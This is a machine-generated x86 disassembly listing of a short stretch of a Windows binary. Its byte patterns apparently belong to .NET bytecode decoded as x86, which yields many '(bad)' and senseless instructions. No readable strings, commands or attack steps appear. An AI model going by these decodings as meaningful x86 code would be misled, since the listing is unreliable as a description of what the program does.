  40465f:	00 0a                	add    %cl,(%edx)
  404661:	dc de                	(bad)
  404663:	03 26                	add    (%esi),%esp
  404665:	de 00                	fiadds (%eax)
  404667:	16                   	push   %ss
  404668:	2a 11                	sub    (%ecx),%dl
  40466a:	05 2a 01 34 00       	add    $0x34012a,%eax
  40466f:	00 02                	add    %al,(%edx)
  404671:	00 19                	add    %bl,(%ecx)
  404673:	00 8b a4 00 0a 00    	add    %cl,0xa00a4(%ebx)
  404679:	00 00                	add    %al,(%eax)
  40467b:	00 02                	add    %al,(%edx)
  40467d:	00 12                	add    %dl,(%edx)
  40467f:	00 9e b0 00 0a 00    	add    %bl,0xa00b0(%esi)
  404685:	00 00                	add    %al,(%eax)
  404687:	00 02                	add    %al,(%edx)
  404689:	00 0b                	add    %cl,(%ebx)
  40468b:	00 b1 bc 00 0a 00    	add    %dh,0xa00bc(%ecx)
  404691:	00 00                	add    %al,(%eax)
  404693:	00 00                	add    %al,(%eax)
  404695:	00 00                	add    %al,(%eax)
  404697:	00 c8                	add    %cl,%al
  404699:	c8 00 03 01          	enter  $0x300,$0x1
  40469d:	00 00                	add    %al,(%eax)
  40469f:	01 1b                	add    %ebx,(%ebx)
  4046a1:	30 02                	xor    %al,(%edx)
  4046a3:	00 1f                	add    %bl,(%edi)
  4046a5:	00 00                	add    %al,(%eax)
  4046a7:	00 1a                	add    %bl,(%edx)
  4046a9:	00 00                	add    %al,(%eax)
  4046ab:	11 16                	adc    %edx,(%esi)
  4046ad:	0a 28                	or     (%eax),%ch
  4046af:	88 00                	mov    %al,(%eax)
  4046b1:	00 0a                	add    %cl,(%edx)
  4046b3:	6f                   	outsl  %ds:(%esi),(%dx)
  4046b4:	b8 00 00 0a 12       	mov    $0x120a0000,%eax
  4046b9:	00 28                	add    %ch,(%eax)
  4046bb:	79 00                	jns    0x4046bd
  4046bd:	00 06                	add    %al,(%esi)
  4046bf:	26 06                	es push %es
  4046c1:	0b de                	or     %esi,%ebx
  4046c3:	05 26 06 0b de       	add    $0xde0b0626,%eax
  4046c8:	00 07                	add    %al,(%edi)
  4046ca:	2a 00                	sub    (%eax),%al
  4046cc:	01 10                	add    %edx,(%eax)
  4046ce:	00 00                	add    %al,(%eax)
  4046d0:	00 00                	add    %al,(%eax)
  4046d2:	02 00                	add    (%eax),%al
  4046d4:	16                   	push   %ss
  4046d5:	18 00                	sbb    %al,(%eax)
  4046d7:	05 01 00 00 01       	add    $0x1000001,%eax
  4046dc:	1b 30                	sbb    (%eax),%esi
  4046de:	01 00                	add    %eax,(%eax)
  4046e0:	23 00                	and    (%eax),%eax
  4046e2:	00 00                	add    %al,(%eax)
  4046e4:	1b 00                	sbb    (%eax),%eax
  4046e6:	00 11                	add    %dl,(%ecx)
  4046e8:	72 d1                	jb     0x4046bb
  4046ea:	23 00                	and    (%eax),%eax
  4046ec:	70 28                	jo     0x404716
  4046ee:	78 00                	js     0x4046f0
  4046f0:	00 06                	add    %al,(%esi)
  4046f2:	0a 12                	or     (%edx),%dl
  4046f4:	00 28                	add    %ch,(%eax)
  4046f6:	b9 00 00 0a 2c       	mov    $0x2c0a0000,%ecx
  4046fb:	04 17                	add    $0x17,%al
  4046fd:	0b de                	or     %esi,%ebx
  4046ff:	09 16                	or     %edx,(%esi)
  404701:	0b de                	or     %esi,%ebx
  404703:	05 26 16 0b de       	add    $0xde0b1626,%eax
  404708:	00 07                	add    %al,(%edi)
  40470a:	2a 00                	sub    (%eax),%al
  40470c:	01 10                	add    %edx,(%eax)
  40470e:	00 00                	add    %al,(%eax)
  404710:	00 00                	add    %al,(%eax)
  404712:	00 00                	add    %al,(%eax)
  404714:	1c 1c                	sbb    $0x1c,%al
  404716:	00 05 01 00 00 01    	add    %al,0x1000001
  40471c:	1b 30                	sbb    (%eax),%esi
  40471e:	02 00                	add    (%eax),%al
  404720:	65 00 00             	add    %al,%gs:(%eax)
  404723:	00 1c 00             	add    %bl,(%eax,%eax,1)
  404726:	00 11                	add    %dl,(%ecx)
  404728:	28 8d 00 00 0a 0a    	sub    %cl,0xa0a0000(%ebp)
  40472e:	16                   	push   %ss
  40472f:	0b 2b                	or     (%ebx),%ebp
  404731:	3d 06 07 9a 0c       	cmp    $0xc9a0706,%eax
  404736:	02 08                	add    (%eax),%cl
  404738:	28 7c 00 00          	sub    %bh,0x0(%eax,%eax,1)
  40473c:	06                   	push   %es
  40473d:	6f                   	outsl  %ds:(%esi),(%dx)
  40473e:	5b                   	pop    %ebx
  40473f:	00 00                	add    %al,(%eax)
  404741:	0a 72 e9             	or     -0x17(%edx),%dh
  404744:	23 00                	and    (%eax),%eax
  404746:	70 6f                	jo     0x4047b7
  404748:	b0 00                	mov    $0x0,%al
  40474a:	00 0a                	add    %cl,(%edx)
  40474c:	2c 18                	sub    $0x18,%al
  40474e:	7e 10                	jle    0x404760
  404750:	00 00                	add    %al,(%eax)
  404752:	04 72                	add    $0x72,%al
  404754:	09 24 00             	or     %esp,(%eax,%eax,1)
  404757:	70 28                	jo     0x404781
  404759:	8d 00                	lea    (%eax),%eax
  40475b:	00 06                	add    %al,(%esi)
  40475d:	26 72 09             	es jb  0x404769
  404760:	24 00                	and    $0x0,%al
  404762:	70 0d                	jo     0x404771
  404764:	de 25 de 03 26 de    	fisubs 0xde2603de
  40476a:	00 07                	add    %al,(%edi)
  40476c:	17                   	pop    %ss
  40476d:	58                   	pop    %eax
  40476e:	0b 07                	or     (%edi),%eax
  404770:	06                   	push   %es
  404771:	8e 69 32             	mov    0x32(%ecx),%gs
  404774:	bd 7e 10 00 00       	mov    $0x107e,%ebp
  404779:	04 72                	add    $0x72,%al
  40477b:	07                   	pop    %es
  40477c:	21 00                	and    %eax,(%eax)
  40477e:	70 28                	jo     0x4047a8
  404780:	8d 00                	lea    (%eax),%eax
  404782:	00 06                	add    %al,(%esi)
  404784:	26 72 07             	es jb  0x40478e
  404787:	21 00                	and    %eax,(%eax)
  404789:	70 2a                	jo     0x4047b5
  40478b:	09 2a                	or     %ebp,(%edx)
  40478d:	00 00                	add    %al,(%eax)
  40478f:	00 01                	add    %al,(%ecx)
  404791:	10 00                	adc    %al,(%eax)
  404793:	00 00                	add    %al,(%eax)
  404795:	00 0e                	add    %cl,(%esi)
  404797:	00 32                	add    %dh,(%edx)
  404799:	40                   	inc    %eax
  40479a:	00 03                	add    %al,(%ebx)
  40479c:	01 00                	add    %eax,(%eax)
  40479e:	00 01                	add    %al,(%ecx)
  4047a0:	1b 30                	sbb    (%eax),%esi
  4047a2:	02 00                	add    (%eax),%al
  4047a4:	6f                   	outsl  %ds:(%esi),(%dx)
  4047a5:	00 00                	add    %al,(%eax)
  4047a7:	00 1d 00 00 11 72    	add    %bl,0x72110000
  4047ad:	0d 24 00 70 03       	or     $0x3700024,%eax
  4047b2:	6f                   	outsl  %ds:(%esi),(%dx)
  4047b3:	ba 00 00 0a 0b       	mov    $0xb0a0000,%edx
  4047b8:	12 01                	adc    (%ecx),%al
  4047ba:	28 bb 00 00 0a 28    	sub    %bh,0x280a0000(%ebx)
  4047c0:	51                   	push   %ecx
  4047c1:	00 00                	add    %al,(%eax)
  4047c3:	0a 73 b1             	or     -0x4f(%ebx),%dh
  4047c6:	00 00                	add    %al,(%eax)
  4047c8:	0a 0a                	or     (%edx),%cl
  4047ca:	06                   	push   %es
  4047cb:	6f                   	outsl  %ds:(%esi),(%dx)
  4047cc:	b2 00                	mov    $0x0,%dl
  4047ce:	00 0a                	add    %cl,(%edx)
  4047d0:	0c 08                	or     $0x8,%al
  4047d2:	28 01                	sub    %al,(%ecx)
  4047d4:	00 00                	add    %al,(%eax)
  4047d6:	2b 28                	sub    (%eax),%ebp
  4047d8:	02 00                	add    (%eax),%al
  4047da:	00 2b                	add    %ch,(%ebx)
  4047dc:	25 2d 04 26 14       	and    $0x1426042d,%eax
  4047e1:	2b 16                	sub    (%esi),%edx
  4047e3:	72 7f                	jb     0x404864
  4047e5:	24 00                	and    $0x0,%al
  4047e7:	70 28                	jo     0x404811
  4047e9:	b5 00                	mov    $0x0,%ch
  4047eb:	00 0a                	add    %cl,(%edx)
  4047ed:	25 2d 04 26 14       	and    $0x1426042d,%eax
  4047f2:	2b 05 6f 38 00 00    	sub    0x386f,%eax
  4047f8:	0a 0d de 1d 08 2c    	or     0x2c081dde,%cl
  4047fe:	06                   	push   %es
  4047ff:	08 6f 33             	or     %ch,0x33(%edi)
  404802:	00 00                	add    %al,(%eax)
  404804:	0a dc                	or     %ah,%bl
  404806:	06                   	push   %es
  404807:	2c 06                	sub    $0x6,%al
  404809:	06                   	push   %es
  40480a:	6f                   	outsl  %ds:(%esi),(%dx)
  40480b:	33 00                	xor    (%eax),%eax
  40480d:	00 0a                	add    %cl,(%edx)
  40480f:	dc 26                	fsubl  (%esi)
  404811:	de 00                	fiadds (%eax)
  404813:	72 bd                	jb     0x4047d2
  404815:	20 00                	and    %al,(%eax)
  404817:	70 2a                	jo     0x404843
  404819:	09 2a                	or     %ebp,(%edx)
  40481b:	00 01                	add    %al,(%ecx)
  40481d:	28 00                	sub    %al,(%eax)
  40481f:	00 02                	add    %al,(%edx)
  404821:	00 25 00 2b 50 00    	add    %ah,0x502b00
  404827:	0a 00                	or     (%eax),%al
  404829:	00 00                	add    %al,(%eax)
  40482b:	00 02                	add    %al,(%edx)
  40482d:	00 1e                	add    %bl,(%esi)
  40482f:	00 3c 5a             	add    %bh,(%edx,%ebx,2)
  404832:	00 0a                	add    %cl,(%edx)
	...
  40483c:	64 64 00 03          	fs add %al,%fs:(%ebx)
  404840:	01 00                	add    %eax,(%eax)
  404842:	00 01                	add    %al,(%ecx)
  404844:	1b 30                	sbb    (%eax),%esi
  404846:	04 00                	add    $0x0,%al
  404848:	5f                   	pop    %edi
  404849:	00 00                	add    %al,(%eax)
  40484b:	00 1e                	add    %bl,(%esi)
  40484d:	00 00                	add    %al,(%eax)
  40484f:	11 1b                	adc    %ebx,(%ebx)
  404851:	8d 01                	lea    (%ecx),%eax
  404853:	00 00                	add    %al,(%eax)
  404855:	01 25 16 28 be 00    	add    %esp,0xbe2816
  40485b:	00 0a                	add    %cl,(%edx)
  40485d:	8c 72 00             	mov    %?,0x0(%edx)
  404860:	00 01                	add    %al,(%ecx)
  404862:	a2 25 17 28 bf       	mov    %al,0xbf281725
  404867:	00 00                	add    %al,(%eax)
  404869:	0a a2 25 18 28 c0    	or     -0x3fd7e7db(%edx),%ah
  40486f:	00 00                	add    %al,(%eax)
  404871:	0a a2 25 19 28 c1    	or     -0x3ed7e6db(%edx),%ah
  404877:	00 00                	add    %al,(%eax)
  404879:	0a a2 25 1a 28 aa    	or     -0x55d7e5db(%edx),%ah
  40487f:	00 00                	add    %al,(%eax)
  404881:	0a 28                	or     (%eax),%ch
  404883:	ab                   	stos   %eax,%es:(%edi)
  404884:	00 00                	add    %al,(%eax)
  404886:	0a 73 ac             	or     -0x54(%ebx),%dh
  404889:	00 00                	add    %al,(%eax)
  40488b:	0a 28                	or     (%eax),%ch
  40488d:	ad                   	lods   %ds:(%esi),%eax
  40488e:	00 00                	add    %al,(%eax)
  404890:	0a 8c 51 00 00 01 a2 	or     -0x5dff0000(%ecx,%edx,2),%cl
  404897:	28 c2                	sub    %al,%dl
  404899:	00 00                	add    %al,(%eax)
  40489b:	0a 28                	or     (%eax),%ch
  40489d:	7f 00                	jg     0x40489f
  40489f:	00 06                	add    %al,(%esi)
  4048a1:	0a de                	or     %dh,%bl
  4048a3:	09 26                	or     %esp,(%esi)
  4048a5:	72 97                	jb     0x40483e
  4048a7:	24 00                	and    $0x0,%al
  4048a9:	70 0a                	jo     0x4048b5
  4048ab:	de 00                	fiadds (%eax)
  4048ad:	06                   	push   %es
  4048ae:	2a 00                	sub    (%eax),%al
  4048b0:	01 10                	add    %edx,(%eax)
  4048b2:	00 00                	add    %al,(%eax)
  4048b4:	00 00                	add    %al,(%eax)
  4048b6:	00 00                	add    %al,(%eax)
  4048b8:	54                   	push   %esp
  4048b9:	54                   	push   %esp
  4048ba:	00 09                	add    %cl,(%ecx)
  4048bc:	01 00                	add    %eax,(%eax)
  4048be:	00 01                	add    %al,(%ecx)
  4048c0:	13 30                	adc    (%eax),%esi
  4048c2:	03 00                	add    (%eax),%eax
  4048c4:	5a                   	pop    %edx
  4048c5:	00 00                	add    %al,(%eax)
  4048c7:	00 1f                	add    %bl,(%edi)
  4048c9:	00 00                	add    %al,(%eax)
  4048cb:	11 73 c3             	adc    %esi,-0x3d(%ebx)
  4048ce:	00 00                	add    %al,(%eax)
  4048d0:	0a 28                	or     (%eax),%ch
  4048d2:	c4 00                	les    (%eax),%eax
  4048d4:	00 0a                	add    %cl,(%edx)
  4048d6:	02 6f 21             	add    0x21(%edi),%ch
  4048d9:	00 00                	add    %al,(%eax)
  4048db:	0a 0a                	or     (%edx),%cl
  4048dd:	06                   	push   %es
  4048de:	6f                   	outsl  %ds:(%esi),(%dx)
  4048df:	c5 00                	lds    (%eax),%eax
  4048e1:	00 0a                	add    %cl,(%edx)
  4048e3:	0a 73 53             	or     0x53(%ebx),%dh
  4048e6:	00 00                	add    %al,(%eax)
  4048e8:	0a 0b                	or     (%ebx),%cl
  4048ea:	06                   	push   %es
  4048eb:	0c 16                	or     $0x16,%al
  4048ed:	0d 2b 1c 08 09       	or     $0x9081c2b,%eax
  4048f2:	91                   	xchg   %eax,%ecx
  4048f3:	13 04 07             	adc    (%edi,%eax,1),%eax
  4048f6:	12 04 72             	adc    (%edx,%esi,2),%al
  4048f9:	a9 24 00 70 28       	test   $0x28700024,%eax
  4048fe:	c6 00 00             	movb   $0x0,(%eax)
  404901:	0a 6f 55             	or     0x55(%edi),%ch
  404904:	00 00                	add    %al,(%eax)
  404906:	0a 26                	or     (%esi),%ah
  404908:	09 17                	or     %edx,(%edi)
  40490a:	58                   	pop    %eax
  40490b:	0d 09 08 8e 69       	or     $0x698e0809,%eax
  404910:	32 de                	xor    %dh,%bl
  404912:	07                   	pop    %es
  404913:	6f                   	outsl  %ds:(%esi),(%dx)
  404914:	38 00                	cmp    %al,(%eax)
  404916:	00 0a                	add    %cl,(%edx)
  404918:	16                   	push   %ss
  404919:	1f                   	pop    %ds
  40491a:	14 6f                	adc    $0x6f,%al
  40491c:	c7 00 00 0a 6f c8    	movl   $0xc86f0a00,(%eax)
  404922:	00 00                	add    %al,(%eax)
  404924:	0a 2a                	or     (%edx),%ch
  404926:	00 00                	add    %al,(%eax)
  404928:	13 30                	adc    (%eax),%esi
  40492a:	07                   	pop    %es
  40492b:	00 b3 01 00 00 20    	add    %dh,0x20000001(%ebx)
  404931:	00 00                	add    %al,(%eax)
  404933:	11 73 62             	adc    %esi,0x62(%ebx)
  404936:	00 00                	add    %al,(%eax)
  404938:	06                   	push   %es
  404939:	25 72 d1 20 00       	and    $0x20d172,%eax
  40493e:	70 6f                	jo     0x4049af
  404940:	4d                   	dec    %ebp
  404941:	00 00                	add    %al,(%eax)
  404943:	06                   	push   %es
  404944:	72 af                	jb     0x4048f5
  404946:	24 00                	and    $0x0,%al
  404948:	70 6f                	jo     0x4049b9
  40494a:	5a                   	pop    %edx
  40494b:	00 00                	add    %al,(%eax)
  40494d:	06                   	push   %es
  40494e:	25 72 c5 24 00       	and    $0x24c572,%eax
  404953:	70 6f                	jo     0x4049c4
  404955:	4d                   	dec    %ebp
  404956:	00 00                	add    %al,(%eax)
  404958:	06                   	push   %es
  404959:	7e 10                	jle    0x40496b
  40495b:	00 00                	add    %al,(%eax)
  40495d:	04 6f                	add    $0x6f,%al
  40495f:	5a                   	pop    %edx
  404960:	00 00                	add    %al,(%eax)
  404962:	06                   	push   %es
  404963:	25 72 cf 24 00       	and    $0x24cf72,%eax
  404968:	70 6f                	jo     0x4049d9
  40496a:	4d                   	dec    %ebp
  40496b:	00 00                	add    %al,(%eax)
  40496d:	06                   	push   %es
  40496e:	28 bf 00 00 0a 6f    	sub    %bh,0x6f0a0000(%edi)
  404974:	38 00                	cmp    %al,(%eax)
  404976:	00 0a                	add    %cl,(%edx)
  404978:	6f                   	outsl  %ds:(%esi),(%dx)
  404979:	5a                   	pop    %edx
  40497a:	00 00                	add    %al,(%eax)
  40497c:	06                   	push   %es
  40497d:	25 72 d9 24 00       	and    $0x24d972,%eax
  404982:	70 6f                	jo     0x4049f3
  404984:	4d                   	dec    %ebp
  404985:	00 00                	add    %al,(%eax)
  404987:	06                   	push   %es
  404988:	73 ae                	jae    0x404938
  40498a:	00 00                	add    %al,(%eax)
  40498c:	0a 28                	or     (%eax),%ch
  40498e:	af                   	scas   %es:(%edi),%eax
  40498f:	00 00                	add    %al,(%eax)
  404991:	0a 6f 38             	or     0x38(%edi),%ch
  404994:	00 00                	add    %al,(%eax)
  404996:	0a 72 df             	or     -0x21(%edx),%dh
  404999:	24 00                	and    $0x0,%al
  40499b:	70 14                	jo     0x4049b1
  40499d:	6f                   	outsl  %ds:(%esi),(%dx)
  40499e:	c9                   	leave
  40499f:	00 00                	add    %al,(%eax)
  4049a1:	0a 72 f3             	or     -0xd(%edx),%dh
  4049a4:	24 00                	and    $0x0,%al
  4049a6:	70 28                	jo     0x4049d0
  4049a8:	ca 00 00             	lret   $0x0
  4049ab:	0a 0a                	or     (%edx),%cl
  4049ad:	12 00                	adc    (%eax),%al
  4049af:	28 cb                	sub    %cl,%bl
  4049b1:	00 00                	add    %al,(%eax)
  4049b3:	0a 72 f7             	or     -0x9(%edx),%dh
  4049b6:	24 00                	and    $0x0,%al
  4049b8:	70 72                	jo     0x404a2c
  4049ba:	01 25 00 70 6f c9    	add    %esp,0xc96f7000
  4049c0:	00 00                	add    %al,(%eax)
  4049c2:	0a 72 0d             	or     0xd(%edx),%dh
  4049c5:	25 00 70 72 19       	and    $0x19727000,%eax
  4049ca:	25 00 70 6f c9       	and    $0xc96f7000,%eax
  4049cf:	00 00                	add    %al,(%eax)
  4049d1:	0a 28                	or     (%eax),%ch
  4049d3:	9c                   	pushf
  4049d4:	00 00                	add    %al,(%eax)
  4049d6:	0a 6f 5a             	or     0x5a(%edi),%ch
  4049d9:	00 00                	add    %al,(%eax)
  4049db:	06                   	push   %es
  4049dc:	25 72 25 25 00       	and    $0x252572,%eax
  4049e1:	70 6f                	jo     0x404a52
  4049e3:	4d                   	dec    %ebp
  4049e4:	00 00                	add    %al,(%eax)
  4049e6:	06                   	push   %es
  4049e7:	28 cc                	sub    %cl,%ah
  4049e9:	00 00                	add    %al,(%eax)
  4049eb:	0a 6f 5a             	or     0x5a(%edi),%ch
  4049ee:	00 00                	add    %al,(%eax)
  4049f0:	06                   	push   %es
  4049f1:	25 72 2f 25 00       	and    $0x252f72,%eax
  4049f6:	70 6f                	jo     0x404a67
  4049f8:	4d                   	dec    %ebp
  4049f9:	00 00                	add    %al,(%eax)
  4049fb:	06                   	push   %es
  4049fc:	7e 03                	jle    0x404a01
  4049fe:	00 00                	add    %al,(%eax)
  404a00:	04 6f                	add    $0x6f,%al
  404a02:	5a                   	pop    %edx
  404a03:	00 00                	add    %al,(%eax)
  404a05:	06                   	push   %es
  404a06:	25 72 3f 25 00       	and    $0x253f72,%eax
  404a0b:	70 6f                	jo     0x404a7c
  404a0d:	4d                   	dec    %ebp
  404a0e:	00 00                	add    %al,(%eax)
  404a10:	06                   	push   %es
  404a11:	28 81 00 00 06 0a    	sub    %al,0xa060000(%ecx)
  404a17:	12 00                	adc    (%eax),%al
  404a19:	28 cb                	sub    %cl,%bl
  404a1b:	00 00                	add    %al,(%eax)
  404a1d:	0a 6f 5b             	or     0x5b(%edi),%ch
  404a20:	00 00                	add    %al,(%eax)
  404a22:	0a 72 4b             	or     0x4b(%edx),%dh
  404a25:	25 00 70 72 3f       	and    $0x3f727000,%eax
  404a2a:	25 00 70 6f c9       	and    $0xc96f7000,%eax
  404a2f:	00 00                	add    %al,(%eax)
  404a31:	0a 72 55             	or     0x55(%edx),%dh
  404a34:	25 00 70 72 cf       	and    $0xcf727000,%eax
  404a39:	24 00                	and    $0x0,%al
  404a3b:	70 6f                	jo     0x404aac
  404a3d:	c9                   	leave
  404a3e:	00 00                	add    %al,(%eax)
  404a40:	0a 6f 5a             	or     0x5a(%edi),%ch
  404a43:	00 00                	add    %al,(%eax)
  404a45:	06                   	push   %es
  404a46:	25 72 61 25 00       	and    $0x256172,%eax
  404a4b:	70 6f                	jo     0x404abc
  404a4d:	4d                   	dec    %ebp
  404a4e:	00 00                	add    %al,(%eax)
  404a50:	06                   	push   %es
  404a51:	72 f9                	jb     0x404a4c
  404a53:	20 00                	and    %al,(%eax)
  404a55:	70 7e                	jo     0x404ad5
  404a57:	10 00                	adc    %al,(%eax)
  404a59:	00 04 28             	add    %al,(%eax,%ebp,1)
  404a5c:	8e 00                	mov    (%eax),%es
  404a5e:	00 06                	add    %al,(%esi)
  404a60:	25 2d 06 26 72       	and    $0x7226062d,%eax
  404a65:	07                   	pop    %es
  404a66:	21 00                	and    %eax,(%eax)
  404a68:	70 28                	jo     0x404a92
  404a6a:	51                   	push   %ecx
  404a6b:	00 00                	add    %al,(%eax)
  404a6d:	0a 6f 5a             	or     0x5a(%edi),%ch
  404a70:	00 00                	add    %al,(%eax)
  404a72:	06                   	push   %es
  404a73:	25 72 79 25 00       	and    $0x257972,%eax
  404a78:	70 6f                	jo     0x404ae9
  404a7a:	4d                   	dec    %ebp
  404a7b:	00 00                	add    %al,(%eax)
  404a7d:	06                   	push   %es
  404a7e:	7e 0e                	jle    0x404a8e
  404a80:	00 00                	add    %al,(%eax)
  404a82:	04 6f                	add    $0x6f,%al
  404a84:	5a                   	pop    %edx
  404a85:	00 00                	add    %al,(%eax)
  404a87:	06                   	push   %es
  404a88:	25 72 8b 25 00       	and    $0x258b72,%eax
  404a8d:	70 6f                	jo     0x404afe
  404a8f:	4d                   	dec    %ebp
  404a90:	00 00                	add    %al,(%eax)
  404a92:	06                   	push   %es
  404a93:	28 83 00 00 06 6f    	sub    %al,0x6f060000(%ebx)
  404a99:	5a                   	pop    %edx
  404a9a:	00 00                	add    %al,(%eax)
  404a9c:	06                   	push   %es
  404a9d:	25 72 9f 25 00       	and    $0x259f72,%eax
  404aa2:	70 6f                	jo     0x404b13
  404aa4:	4d                   	dec    %ebp
  404aa5:	00 00                	add    %al,(%eax)
  404aa7:	06                   	push   %es
  404aa8:	28 cc                	sub    %cl,%ah
  404aaa:	00 00                	add    %al,(%eax)
  404aac:	0a 73 87             	or     -0x79(%ebx),%dh
  404aaf:	00 00                	add    %al,(%eax)
  404ab1:	0a 28                	or     (%eax),%ch
  404ab3:	cd 00                	int    $0x0
  404ab5:	00 0a                	add    %cl,(%edx)
  404ab7:	0b 12                	or     (%edx),%edx
  404ab9:	01 28                	add    %ebp,(%eax)
  404abb:	ce                   	into
  404abc:	00 00                	add    %al,(%eax)
  404abe:	0a 0b                	or     (%ebx),%cl
  404ac0:	12 01                	adc    (%ecx),%al
  404ac2:	28 cf                	sub    %cl,%bh
  404ac4:	00 00                	add    %al,(%eax)
  404ac6:	0a 6f 5a             	or     0x5a(%edi),%ch
  404ac9:	00 00                	add    %al,(%eax)
  404acb:	06                   	push   %es
  404acc:	25 72 b3 25 00       	and    $0x25b372,%eax
  404ad1:	70 6f                	jo     0x404b42
  404ad3:	4d                   	dec    %ebp
  404ad4:	00 00                	add    %al,(%eax)
  404ad6:	06                   	push   %es
  404ad7:	72 bd                	jb     0x404a96
  404ad9:	20 00                	and    %al,(%eax)
  404adb:	70 6f                	jo     0x404b4c
  404add:	5a                   	pop    %edx
  404ade:	00 00                	add    %al,(%eax)
  404ae0:	06                   	push   %es
  404ae1:	6f                   	outsl  %ds:(%esi),(%dx)
  404ae2:	57                   	push   %edi
  404ae3:	00 00                	add    %al,(%eax)
  404ae5:	06                   	push   %es
  404ae6:	2a 00                	sub    (%eax),%al
  404ae8:	1b 30                	sbb    (%eax),%esi
  404aea:	02 00                	add    (%eax),%al
  404aec:	43                   	inc    %ebx
  404aed:	00 00                	add    %al,(%eax)
  404aef:	00 00                	add    %al,(%eax)
  404af1:	00 00                	add    %al,(%eax)
  404af3:	00 7e 0f             	add    %bh,0xf(%esi)
  404af6:	00 00                	add    %al,(%eax)
  404af8:	04 28                	add    $0x28,%al
  404afa:	17                   	pop    %ss
  404afb:	00 00                	add    %al,(%eax)
  404afd:	0a 2c 0c             	or     (%esp,%ecx,1),%ch
  404b00:	28 81 00 00 06 2c    	sub    %al,0x2c060000(%ecx)
  404b06:	05 28 8b 00 00       	add    $0x8b28,%eax
  404b0b:	06                   	push   %es
  404b0c:	28 88 00 00 06 28    	sub    %cl,0x28060000(%eax)
  404b12:	08 00                	or     %al,(%eax)
  404b14:	00 06                	add    %al,(%esi)
  404b16:	25 2d 03 26 2b       	and    $0x2b26032d,%eax
  404b1b:	05 6f 76 00 00       	add    $0x766f,%eax
  404b20:	0a 28                	or     (%eax),%ch
  404b22:	06                   	push   %es
  404b23:	00 00                	add    %al,(%eax)
  404b25:	06                   	push   %es
  404b26:	25 2d 03 26 2b       	and    $0x2b26032d,%eax
  404b2b:	05 28 d3 00 00       	add    $0xd328,%eax
  404b30:	0a de                	or     %dh,%bl
  404b32:	03 26                	add    (%esi),%esp
  404b34:	de 00                	fiadds (%eax)
  404b36:	2a 00                	sub    (%eax),%al
  404b38:	01 10                	add    %edx,(%eax)
  404b3a:	00 00                	add    %al,(%eax)
  404b3c:	00 00                	add    %al,(%eax)
  404b3e:	00 00                	add    %al,(%eax)
  404b40:	3f                   	aas
  404b41:	3f                   	aas
  404b42:	00 03                	add    %al,(%ebx)
  404b44:	01 00                	add    %eax,(%eax)
  404b46:	00 01                	add    %al,(%ecx)
  404b48:	1b 30                	sbb    (%eax),%esi
  404b4a:	03 00                	add    (%eax),%eax
  404b4c:	a0 00 00 00 21       	mov    0x21000000,%al
  404b51:	00 00                	add    %al,(%eax)
  404b53:	11 72 bd             	adc    %esi,-0x43(%edx)
  404b56:	25 00 70 28 c0       	and    $0xc0287000,%eax
  404b5b:	00 00                	add    %al,(%eax)
  404b5d:	0a 72 c3             	or     -0x3d(%edx),%dh
  404b60:	25 00 70 28 9c       	and    $0x9c287000,%eax
  404b65:	00 00                	add    %al,(%eax)
  404b67:	0a 72 ef             	or     -0x11(%edx),%dh
  404b6a:	25 00 70 73 d4       	and    $0xd4737000,%eax
  404b6f:	00 00                	add    %al,(%eax)
  404b71:	0a 0a                	or     (%edx),%cl
  404b73:	73 d5                	jae    0x404b4a
  404b75:	00 00                	add    %al,(%eax)
  404b77:	0a 0b                	or     (%ebx),%cl
  404b79:	06                   	push   %es
  404b7a:	6f                   	outsl  %ds:(%esi),(%dx)
  404b7b:	b2 00                	mov    $0x0,%dl
  404b7d:	00 0a                	add    %cl,(%edx)
  404b7f:	6f                   	outsl  %ds:(%esi),(%dx)
  404b80:	b3 00                	mov    $0x0,%bl
  404b82:	00 0a                	add    %cl,(%edx)
  404b84:	0c 2b                	or     $0x2b,%al
  404b86:	1d 08 6f b4 00       	sbb    $0xb46f08,%eax
  404b8b:	00 0a                	add    %cl,(%edx)
  404b8d:	0d 07 09 72 2d       	or     $0x2d720907,%eax
  404b92:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  404b96:	b5 00                	mov    $0x0,%ch
  404b98:	00 0a                	add    %cl,(%edx)
  404b9a:	6f                   	outsl  %ds:(%esi),(%dx)
  404b9b:	38 00                	cmp    %al,(%eax)
  404b9d:	00 0a                	add    %cl,(%edx)
  404b9f:	6f                   	outsl  %ds:(%esi),(%dx)
  404ba0:	d6                   	salc
  404ba1:	00 00                	add    %al,(%eax)
  404ba3:	0a 08                	or     (%eax),%cl
  404ba5:	6f                   	outsl  %ds:(%esi),(%dx)
  404ba6:	b7 00                	mov    $0x0,%bh
  404ba8:	00 0a                	add    %cl,(%edx)
  404baa:	2d db de 0a 08       	sub    $0x80adedb,%eax
  404baf:	2c 06                	sub    $0x6,%al
  404bb1:	08 6f 33             	or     %ch,0x33(%edi)
  404bb4:	00 00                	add    %al,(%eax)
  404bb6:	0a dc                	or     %ah,%bl
  404bb8:	07                   	pop    %es
  404bb9:	6f                   	outsl  %ds:(%esi),(%dx)
  404bba:	d7                   	xlat   %ds:(%ebx)
  404bbb:	00 00                	add    %al,(%eax)
  404bbd:	0a 2d 09 72 45 26    	or     0x26457209,%ch
  404bc3:	00 70 13             	add    %dh,0x13(%eax)
  404bc6:	04 de                	add    $0xde,%al
  404bc8:	28 72 4d             	sub    %dh,0x4d(%edx)
  404bcb:	26 00 70 07          	add    %dh,%es:0x7(%eax)
  404bcf:	6f                   	outsl  %ds:(%esi),(%dx)
  404bd0:	d8 00                	fadds  (%eax)
  404bd2:	00 0a                	add    %cl,(%edx)
  404bd4:	28 d9                	sub    %bl,%cl
  404bd6:	00 00                	add    %al,(%eax)
  404bd8:	0a 13                	or     (%ebx),%dl
  404bda:	04 de                	add    $0xde,%al
  404bdc:	14 06                	adc    $0x6,%al
  404bde:	2c 06                	sub    $0x6,%al
  404be0:	06                   	push   %es
  404be1:	6f                   	outsl  %ds:(%esi),(%dx)
  404be2:	33 00                	xor    (%eax),%eax
  404be4:	00 0a                	add    %cl,(%edx)
  404be6:	dc 26                	fsubl  (%esi)
  404be8:	72 45                	jb     0x404c2f
  404bea:	26 00 70 13          	add    %dh,%es:0x13(%eax)
  404bee:	04 de                	add    $0xde,%al
  404bf0:	00 11                	add    %dl,(%ecx)
  404bf2:	04 2a                	add    $0x2a,%al
  404bf4:	01 28                	add    %ebp,(%eax)
  404bf6:	00 00                	add    %al,(%eax)
  404bf8:	02 00                	add    (%eax),%al
  404bfa:	31 00                	xor    %eax,(%eax)
  404bfc:	29 5a 00             	sub    %ebx,0x0(%edx)
  404bff:	0a 00                	or     (%eax),%al
